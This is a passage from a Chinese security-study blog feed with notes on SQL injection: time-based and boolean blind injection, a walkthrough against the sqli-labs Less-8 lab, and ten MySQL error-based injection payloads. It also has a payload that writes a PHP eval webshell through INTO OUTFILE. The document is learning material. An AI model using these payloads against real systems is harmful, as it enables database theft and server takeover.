      &lt;p&gt;&lt;strong&gt;Abstract&lt;/strong&gt;: SQLMap 的简单应用&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://yoursite.com/categories/Web-Security/"/>
    
      <category term="笔记" scheme="http://yoursite.com/categories/Web-Security/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="SQL 盲注" scheme="http://yoursite.com/tags/SQL-%E7%9B%B2%E6%B3%A8/"/>
    
  </entry>
  
  <entry>
    <title>笔记34</title>
    <link href="http://yoursite.com/2019/08/29/note34/"/>
    <id>http://yoursite.com/2019/08/29/note34/</id>
    <published>2019-08-29T11:49:36.000Z</published>
    <updated>2019-09-09T05:38:37.527Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Abstract</strong>: SQL 盲注之时间盲注</p><a id="more"></a><!--export--><!--toc--><h3 id="SQL-盲注"><a href="#SQL-盲注" class="headerlink" title="SQL 盲注"></a>SQL 盲注</h3><h4 id="sleep-second-函数"><a href="#sleep-second-函数" class="headerlink" title="sleep(second) 函数"></a>sleep(second) 函数</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 系统睡眠3秒，查询结果为0</span><br><span class="line">select sleep(3);</span><br></pre></td></tr></table></figure><p>时间可以精确控制。</p><h4 id="benchmark-number-function-函数"><a href="#benchmark-number-function-函数" class="headerlink" title="benchmark(number, function)函数"></a>benchmark(number, function)函数</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 重复执行某个函数N次</span><br><span class="line">select benchmark(10000000, md5(1);</span><br></pre></td></tr></table></figure><p>时间不可控，电脑性能越高，时间越短。</p><table><thead><tr><th align="center">select * from table where id = 1</th><th align="center">and if(布尔表达式, 0, 1);</th></tr></thead><tbody><tr><td align="center">原始语句</td><td align="center">测试语句+注入语句</td></tr></tbody></table><p><em>参考文章</em></p><blockquote><p><a href="https://www.cnblogs.com/-qing-/p/10894310.html" target="_blank" rel="noopener">MySQL时间盲注五种延时方法 (PWNHUB 非预期解)</a></p></blockquote><h4 id="and-0-的短路特性"><a href="#and-0-的短路特性" class="headerlink" title="and 0 的短路特性"></a>and 0 的短路特性</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=1 and 1 and sleep(1);</span><br><span class="line"># 1.00sec</span><br><span class="line">select * from users where id=1 and 0 and sleep(1);</span><br><span class="line"># 0.00 sec</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select 1 and sleep(3);</span><br><span class="line"># 3.00 sec</span><br><span class="line">select 0 and sleep(3);</span><br><span class="line"># 0.00 sec</span><br></pre></td></tr></table></figure><h4 id="or-1-的短路特性"><a href="#or-1-的短路特性" class="headerlink" title="or 1 的短路特性"></a>or 1 的短路特性</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=1 or 1 or sleep(1);</span><br><span class="line"># 0.00 sec</span><br><span class="line">select * from users where id=1 or 0 or sleep(1);</span><br><span class="line"># 1.00 sec</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select 1 or sleep(3);</span><br><span class="line"># 0.00 sec</span><br><span class="line">select 0 or sleep(3);</span><br><span class="line"># 3.00 sec</span><br></pre></td></tr></table></figure><h4 id="条件语句"><a href="#条件语句" class="headerlink" title="条件语句"></a>条件语句</h4><ul><li><code>if(布尔语句, 0, 1)</code></li></ul><p>条件成立取 0 ，条件不成立取 1 。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 睡眠3秒</span><br><span class="line">select if(length(version())&gt;1, sleep(3), 0);</span><br><span class="line"># 直接返回0</span><br><span class="line">select if(length(version())&gt;15, sleep(3), 0);</span><br></pre></td></tr></table></figure><ul><li><code>case [1] when [2] then [3] else [4] end</code></li></ul><p>当 [1] 的值与 [2] 的值相等时，取 [3]，否则取 [4]</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select case 1=1 when 1 then 123 else 456 end;</span><br><span class="line"># 123</span><br></pre></td></tr></table></figure><p><code>or</code> 的影响</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=&apos;1&apos; or sleep(3); #&apos;;</span><br><span class="line"># 1 row in set (36.01 sec)</span><br></pre></td></tr></table></figure><p><strong>注意</strong>：<code>sleep</code>是存在一个满足条件的行就会延迟指定的时间，比如 <code>sleep(5)</code>，但实际上查找到两个满足条件的行，那么就会延迟 10s ，在真实的渗透测试过程中，我们有时候不清楚整个表的情况，可以用 <code>sleep(0.001)</code>看最后多少秒有结果，推断表的行数。</p><p><em>参考文章</em></p><blockquote><p><a href="https://www.anquanke.com/post/id/170626" target="_blank" rel="noopener">一篇文章带你深入理解 SQL 盲注</a></p></blockquote><h4 id="用-SQL-注入写webshell"><a href="#用-SQL-注入写webshell" class="headerlink" title="用 SQL 注入写webshell"></a>用 SQL 注入写webshell</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.197/Less-1/?id=1&apos; union select 1,2, &apos;&lt;?php @eval($_POST[&apos;pass&apos;])?&gt;&apos; into outfile &apos;/var/www/html/case.txt&apos; --+</span><br></pre></td></tr></table></figure><p>注意权限问题，此时创建文件的用户是 <code>mysql</code></p><h4 id="防止-SQL-注入常用函数"><a href="#防止-SQL-注入常用函数" class="headerlink" title="防止 SQL 注入常用函数"></a>防止 SQL 注入常用函数</h4><p><code>addslashes()</code>和 <code>mysql_real_escape_string()</code></p><p>详细内容请访问：</p><p><a href="https://meethanmj.github.io/2019/08/17/php-file-func/" target="_blank" rel="noopener">PHP内置过滤函数</a></p><h4 id="寻找-SQL-注入点思路"><a href="#寻找-SQL-注入点思路" class="headerlink" title="寻找 SQL 注入点思路"></a>寻找 SQL 注入点思路</h4><p><img src="/images/139sqlinjec.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;Abstract&lt;/strong&gt;: SQL 盲注之时间盲注&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://yoursite.com/categories/Web-Security/"/>
    
      <category term="笔记" scheme="http://yoursite.com/categories/Web-Security/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="SQL 盲注" scheme="http://yoursite.com/tags/SQL-%E7%9B%B2%E6%B3%A8/"/>
    
  </entry>
  
  <entry>
    <title>练习10</title>
    <link href="http://yoursite.com/2019/08/28/practice10/"/>
    <id>http://yoursite.com/2019/08/28/practice10/</id>
    <published>2019-08-28T11:40:45.000Z</published>
    <updated>2019-08-29T00:15:40.757Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Abstract</strong>: SQL 盲注总结，目标站点是 <code>sqli-labs</code> 中的 <code>Less-8</code></p><a id="more"></a><!--export--><!--toc--><h3 id="找注入点"><a href="#找注入点" class="headerlink" title="找注入点"></a>找注入点</h3><p>拿到一个目标站点首先找到注入点，<code>Less-8</code> 注入点为 <code>?id=1</code></p><h3 id="判断类型"><a href="#判断类型" class="headerlink" title="判断类型"></a>判断类型</h3><p>发现输入 <code>id=1&#39;</code> 后页面的 <code>You are in ...</code> 消失了，没有报错信息。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.52/sqli-labs/Less-8/?id=1'</span><br></pre></td></tr></table></figure><p>再次输入</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.52/sqli-labs/Less-8/?id=1' --+</span><br></pre></td></tr></table></figure><p>页面正常显示，所以该注入点为字符型注入，由于页面不显示错误信息，所以使用盲注的方法。</p><h3 id="判断数据库个数"><a href="#判断数据库个数" class="headerlink" title="判断数据库个数"></a>判断数据库个数</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.52/sqli-labs/Less-8/?id=1' and (select count(schema_name) from information_schema.schemata)&gt;4 --+</span><br></pre></td></tr></table></figure><p><img src="/images/127errorInjec_count.png" alt></p><p>发现 <code>&gt;4</code>正常显示，<code>&gt;5</code>不正常，故可知数据库个数为 5。</p><h3 id="判断各数据库名的长度"><a href="#判断各数据库名的长度" class="headerlink" title="判断各数据库名的长度"></a>判断各数据库名的长度</h3><p>先判断第一个数据库名的长度</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.52/sqli-labs/Less-8/?id=1' and length((select schema_name from information_schema.schemata limit 0,1))&gt;17 --+</span><br></pre></td></tr></table></figure><p><img src="/images/128fires_schemata_length.png" alt></p><p>可得第一个库的长度为 18 。</p><h3 id="判断数据库名"><a href="#判断数据库名" class="headerlink" title="判断数据库名"></a>判断数据库名</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.52/sqli-labs/Less-8/?id=1' and ascii(mid((select schema_name from information_schema.schemata limit 0, 1), 1, 1)) &gt;104 --+</span><br></pre></td></tr></table></figure><p>可得第一个字符为 <code>i</code> 。</p><p><img src="/images/125errorInjec_schema.png" alt></p><p>继续往下做判断</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.52/sqli-labs/Less-8/?id=1' and ascii(mid((select schema_name from information_schema.schemata limit 0, 1), 1, 1)) &gt;109 --+</span><br></pre></td></tr></table></figure><p><img src="/images/126errorInjec_judge_schemata.png" alt></p><p>可得第二个字符是 <code>n</code></p><p>可以以此判断出数据库中各个库名。</p><h3 id="判断当前数据库中表的个数"><a href="#判断当前数据库中表的个数" class="headerlink" title="判断当前数据库中表的个数"></a>判断当前数据库中表的个数</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.52/sqli-labs/Less-8/?id=1' and (select count(table_name) from information_schema.tables where table_schema=database())&gt;3 --+</span><br></pre></td></tr></table></figure><p><img src="/images/129count_current_database_tables.png" alt></p><h3 id="判断当前数据库中各个表名的长度"><a href="#判断当前数据库中各个表名的长度" class="headerlink" title="判断当前数据库中各个表名的长度"></a>判断当前数据库中各个表名的长度</h3><p>先判断第一个表名长度</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.52/sqli-labs/Less-8/?id=1' and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&gt;1 --+</span><br></pre></td></tr></table></figure><p><img src="/images/130count_current_table_length.png" alt></p><h3 id="判断当前数据库中表名"><a href="#判断当前数据库中表名" class="headerlink" title="判断当前数据库中表名"></a>判断当前数据库中表名</h3><p>判断第一个表名</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.52/sqli-labs/Less-8/?id=1' and ascii(mid((select table_name from information_schema.tables where table_schema=database() limit 0, 1), 1, 1)) &gt;100 --+</span><br></pre></td></tr></table></figure><p><img src="/images/130juage_table_name.png" alt></p><p>字符为 <code>e</code> ，继续判断可以得出该表名为 <code>emails</code>。</p><h3 id="查看-users-表中字段个数"><a href="#查看-users-表中字段个数" class="headerlink" title="查看 users 表中字段个数"></a>查看 <code>users</code> 表中字段个数</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.52/sqli-labs/Less-8/?id=1' and (select count(column_name) from information_schema.columns where table_schema=database() and table_name='users') &gt; 2 --+</span><br></pre></td></tr></table></figure><p><img src="/images/131.png" alt></p><p>个数为 3 。</p><h3 id="判断-users-表中第一个字段长度"><a href="#判断-users-表中第一个字段长度" class="headerlink" title="判断 users 表中第一个字段长度"></a>判断 <code>users</code> 表中第一个字段长度</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.52/sqli-labs/Less-8/?id=1' and length((select column_name from information_schema.columns where table_schema=database() and table_name = 'users' limit 0,1)) &gt; 1 --+</span><br></pre></td></tr></table></figure><p>第一个字段长度为 2 。</p><h3 id="判断第一个字段"><a href="#判断第一个字段" class="headerlink" title="判断第一个字段"></a>判断第一个字段</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.52/sqli-labs/Less-8/?id=1' and ascii(mid((select column_name from information_schema.columns where table_schema=database() and table_name = 'users' limit 0, 1), 1, 1)) &gt;104 --+</span><br></pre></td></tr></table></figure><p><img src="/images/133.png" alt></p><p>不难判断出第一个字段为 <code>id</code>。</p><h3 id="判断users-表行数"><a href="#判断users-表行数" class="headerlink" title="判断users 表行数"></a>判断<code>users</code> 表行数</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.52/sqli-labs/Less-8/?id=1' and (select count(*) from security.users) &gt;13 --+</span><br></pre></td></tr></table></figure><p><img src="/images/134.png" alt></p><p>可以查看 <code>users</code>表中的内容。</p><h3 id="总结-SQL-盲注流程"><a href="#总结-SQL-盲注流程" class="headerlink" title="总结 SQL 盲注流程"></a>总结 SQL 盲注流程</h3><ol><li>先找注入点</li><li>判断类型<ol><li>字符型？整型？</li><li>盲注还是 <code>UNION SELECT</code></li></ol></li><li>先查一共有几个数据库</li><li>再查各个数据库长度，为判断库名做准备</li><li>依次判断出数据库的名称，找到自己想要查询的库</li><li>先查库中有几个表</li><li>查各个表的长度</li><li>依次判断出各个表名</li><li>查表中有几个字段</li><li>查各个字段长度</li><li>依次判断字段名</li><li>判断出想要字段的数据</li></ol><h3 id="用burpsuite判断"><a href="#用burpsuite判断" class="headerlink" title="用burpsuite判断"></a>用burpsuite判断</h3><p>把要做判断的 <code>url</code> 发送到 <code>Intruder</code></p><p><img src="/images/135.png" alt></p><p>点击 <code>Clear $</code> ，在 <code>=%27i%27</code> 中字母 <code>i</code> 两边加上 <code>$</code> ，然后点击 <code>Payloads</code>，在 <code>Payload type</code> 选择 <code>Brute forcer</code>，<code>Min length</code> 选择 <code>1</code>，<code>Max length</code> 选择 <code>1</code>。</p><p><img src="/images/136.png" alt></p><p>然后点击 <code>Start attack</code></p><p><img src="/images/137.png" alt></p><p><img src="/images/138.png" alt></p><p>继续改变位置可查出库名，同理表名，字段名也可以查出。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;Abstract&lt;/strong&gt;: SQL 盲注总结，目标站点是 &lt;code&gt;sqli-labs&lt;/code&gt; 中的 &lt;code&gt;Less-8&lt;/code&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://yoursite.com/categories/Web-Security/"/>
    
    
      <category term="SQL盲注" scheme="http://yoursite.com/tags/SQL%E7%9B%B2%E6%B3%A8/"/>
    
  </entry>
  
  <entry>
    <title>笔记33</title>
    <link href="http://yoursite.com/2019/08/28/note33/"/>
    <id>http://yoursite.com/2019/08/28/note33/</id>
    <published>2019-08-28T11:37:48.000Z</published>
    <updated>2019-09-09T05:38:30.392Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Abstract</strong>: SQL 盲注</p><a id="more"></a><!--export--><!--toc--><h3 id="URL-注释"><a href="#URL-注释" class="headerlink" title="URL 注释"></a><code>URL</code> 注释</h3><ol><li><code>-- |</code> 空格后面可以跟上任何字符</li><li><code>--+</code> <code>URL</code> 中会把 <code>+</code> 解析为空格</li><li><code>#</code> 识别为锚点</li></ol><p><code>GET</code> 参数会被 <code>url</code> 编码，但 <code>POST</code> 参数不会被 <code>url</code> 编码，请求头也不会编码。</p><p>整型 <code>id=26-1</code>可以用，但 <code>id=3+9</code> 却不能用，因为 <code>+</code> 解析为空格。</p><table><thead><tr><th align="center">符号</th><th align="center"><code>url</code> 编码</th></tr></thead><tbody><tr><td align="center">空格</td><td align="center">%20</td></tr><tr><td align="center">‘</td><td align="center">%27</td></tr><tr><td align="center">#</td><td align="center">%23</td></tr><tr><td align="center">“</td><td align="center">%22</td></tr><tr><td align="center">%</td><td align="center">%25</td></tr><tr><td align="center">&amp;</td><td align="center">%26</td></tr><tr><td align="center">/</td><td align="center">%2F</td></tr></tbody></table><h3 id="十种-MySQL-报错注入"><a href="#十种-MySQL-报错注入" class="headerlink" title="十种 MySQL 报错注入"></a>十种 <code>MySQL</code> 报错注入</h3><ol><li><code>floor()</code></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);</span><br></pre></td></tr></table></figure><p><code>floor()</code> 报错注入准确地说应该是 <code>floor</code>，<code>count</code>，<code>group by</code> 冲突报错。特定情况下，三个函数在一起使用会产生错误。</p><p>经典的 <code>floor</code> 注入语句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);</span><br></pre></td></tr></table></figure><p>首先看 <code>floor()</code> 报错产生条件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*), concat(database(), floor(rand(0)*2))x from security.users group by x</span><br></pre></td></tr></table></figure><p>语句中 <code>x</code> 是给 <code>floor(rand(0)*2)</code>添加一个别名，执行该语句得到： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!#1062 - Duplicate entry &apos;security1&apos; for key &apos;&lt;group_key&gt;&apos;</span><br></pre></td></tr></table></figure><p><code>floor()</code> 报错原理分析：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(), floor(rand(0)*2) as x from information_schema_tables groupby a;</span><br></pre></td></tr></table></figure><p>重点在 <code>group by a</code> ，即 <code>group by floor(rand(0)*2)</code>。首先，<code>floor(rand(0)*2)</code> 意思是随机产生 0 或 1。虽说是随机的，但有规律可循，基本上是 <code>011011</code>这个序列。</p><p>为什么报错？</p><p>首先，系统会建立一个虚拟表：</p><table><thead><tr><th align="center">key</th><th align="center">count(*)</th></tr></thead><tbody><tr><td align="center"></td><td align="center"></td></tr><tr><td align="center"></td><td align="center"></td></tr></tbody></table><p>假设有表：</p><table><thead><tr><th align="center">id</th><th align="center">name</th><th align="center">age</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">11</td><td align="center">18</td></tr><tr><td align="center">2</td><td align="center">22</td><td align="center">19</td></tr><tr><td align="center">3</td><td align="center">33</td><td align="center">20</td></tr><tr><td align="center">4</td><td align="center">44</td><td align="center">20</td></tr><tr><td align="center">5</td><td align="center">55</td><td align="center">18</td></tr></tbody></table><p>执行 <code>count(*) from ... group by age</code> 的过程中，会形成这样的虚拟表：</p><table><thead><tr><th align="center">key</th><th align="center">count(*)</th></tr></thead><tbody><tr><td align="center">18</td><td align="center">2</td></tr><tr><td align="center">19</td><td align="center">1</td></tr><tr><td align="center">20</td><td align="center">2</td></tr></tbody></table><p>那么这个表是如何形成的？由于 <code>group by</code> 的是 <code>age</code>，第一次读取的是 18 ，在虚拟表中寻找是否已经存在 18 ，由于表是空的，直接插入一条新数据，这时虚拟表变成这样：</p><table><thead><tr><th align="center">key</th><th align="center">count(*)</th></tr></thead><tbody><tr><td align="center">18</td><td align="center">1</td></tr><tr><td align="center"></td><td align="center"></td></tr><tr><td align="center"></td><td align="center"></td></tr></tbody></table><p>下一个时 19 ，由于虚拟表中依旧没有 key 为 19 的字段，故插入。再插入 20 ，和 19 的情况一样，当继续插入 第二个 20 时，由于已经有了 20 ，故将 key 为 20 的字段的 count(*) 的值加 1，依次类推，形成最后的虚拟表：</p><table><thead><tr><th align="center">key</th><th align="center">count(*)</th></tr></thead><tbody><tr><td align="center">18</td><td align="center">2</td></tr><tr><td align="center">19</td><td align="center">1</td></tr><tr><td align="center">20</td><td align="center">2</td></tr></tbody></table><p>如何将 <code>group by</code> 与 <code>floor</code> 联合起来，进行 <code>floor</code> 报错？</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(), floor(rand(0)*2) as a from information_schema.tables group by a;</span><br></pre></td></tr></table></figure><p><code>group by</code> 的是 <code>floor(rand(0)*2)</code> 每次运算的值都是随机的，首先，建立一张虚拟表，</p><table><thead><tr><th align="center">key</th><th align="center">count(*)</th></tr></thead><tbody><tr><td align="center"></td><td align="center"></td></tr><tr><td align="center"></td><td align="center"></td></tr><tr><td align="center"></td><td align="center"></td></tr></tbody></table><p>接着，进行 <code>group by floor(rand(0)*2)</code> 。floor 表达式第一次运算的值为 0 ，在表中没有找到 key 为 0 的数据，故插入，在插入过程中需要再取一次  group by 后面的值，即在执行一次 floor 运算，结果为 1，取到了 1 ，插入数据，并将 count() 置 1.</p><table><thead><tr><th align="center">key</th><th align="center">count(*)</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">1</td></tr><tr><td align="center"></td><td align="center"></td></tr></tbody></table><p>再进行 group by floor(rand(0)2)，表为</p><table><thead><tr><th align="center">key</th><th align="center">count(*)</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">2</td></tr><tr><td align="center"></td><td align="center"></td></tr></tbody></table><p>执行到第四次 floor 运算时，这次值为 0 ，表中没有找到 key 为 0 的数据，故应当插入一条新数据，插入时，进行 floor 运算，这时值为 1，将 count(*) 置 1 。但虚拟表中已经有了 key 为 1数据，故此时会抛出主键冗余的异常，这就是所谓的 floor 报错。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);</span><br></pre></td></tr></table></figure><ol start="2"><li><code>extractvalue()</code></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));</span><br></pre></td></tr></table></figure><ol start="3"><li><code>updatexml()</code></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));</span><br></pre></td></tr></table></figure><ol start="4"><li><code>geometrycollection()</code></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure><ol start="5"><li><code>multipoint()</code></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and multipoint((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure><ol start="6"><li><code>polygon()</code></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and polygon((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure><ol start="7"><li><code>multipolygon()</code></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure><ol start="8"><li><code>linestring()</code></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and linestring((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure><ol start="9"><li><code>exp()</code></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and exp(~(select * from(select user())a));</span><br></pre></td></tr></table></figure><ol start="10"><li><code>multilinestring()</code></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure><p>其中，对于 <code>mariadb</code> ，方法 <code>1-3</code> 适用，<code>mysql 8.0</code>  方法 <code>2-3</code> 可用，<code>mysql 5.0</code> 方法 <code>1-9</code> 适用。</p><h3 id="SQL-盲注"><a href="#SQL-盲注" class="headerlink" title="SQL 盲注"></a>SQL 盲注</h3><p>盲注流程：</p><ol><li>先判断总数</li><li>判断单个长度</li><li>逐个字符判断名称，二分法</li></ol><p>常用函数</p><table><thead><tr><th align="center">函数</th><th align="center">功能</th></tr></thead><tbody><tr><td align="center">ascii(‘A’)</td><td align="center">查看 ASCII 码</td></tr><tr><td align="center">char(100)</td><td align="center">通过 ASCII 码，查看字符</td></tr><tr><td align="center">substr/mid(str, start,length)</td><td align="center">截取字符</td></tr><tr><td align="center">length(string)</td><td align="center">计算字符串长度</td></tr><tr><td align="center">count( )</td><td align="center">统计个数</td></tr></tbody></table><p>常用命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 库名</span><br><span class="line">http://192.168.100.52/sqli-labs/Less-8/?id=1&apos; and select group_concat(schema_name) from information_schema.schemata --+</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 库名长度</span><br><span class="line">http://192.168.100.52/sqli-labs/Less-8/?id=1&apos; and length((select group_concat(schema_name) from information_schema.schemata)) &gt; 50 --+</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 判断各个字符 ASCII</span><br><span class="line">http://192.168.100.52/sqli-labs/Less-8/?id=1&apos; and ascii(mid((select group_concat(schema_name) from information_schema.schemata), 1, 1)) &gt; 50 --+</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.52/sqli-labs/Less-8/?id=1&apos;and (select count(distinct schema_name) from information_schema.schemata) &gt; 3 ——+</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.52/sqli-labs/Less-8/?id=1&apos; and mid((select distinct schema_name from information_schema.schemata limit 0,1), 1, 1) &gt; 50 --+</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 查看当前数据中有几张表</span><br><span class="line">http://192.168.100.52/sqli-labs/Less-8/?id=1&apos; and (select count(table_name) from information_schema.tables where table_schema = database()) &gt; 1 --+</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 查看一张表的名字</span><br><span class="line">http://192.168.100.52/sqli-labs/Less-8/?id=1&apos; and length((select table_name from information_schema.tables where table_schema = database() limit 0,1)) &gt; 1 --+</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.52/sqli-labs/Less-8/?id=1&apos; and ascii(mid((select table_name from information_schema.tables where table_schema = database() limit 0,1), 1, 1)) &gt; 100 --+</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;Abstract&lt;/strong&gt;: SQL 盲注&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://yoursite.com/categories/Web-Security/"/>
    
      <category term="笔记" scheme="http://yoursite.com/categories/Web-Security/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="SQL 盲注" scheme="http://yoursite.com/tags/SQL-%E7%9B%B2%E6%B3%A8/"/>
    
  </entry>
  
  <entry>
    <title>练习9</title>
    <link href="http://yoursite.com/2019/08/27/practice9/"/>
    <id>http://yoursite.com/2019/08/27/practice9/</id>
    <published>2019-08-27T12:22:54.000Z</published>
    <updated>2019-08-27T13:00:34.857Z</updated>
    
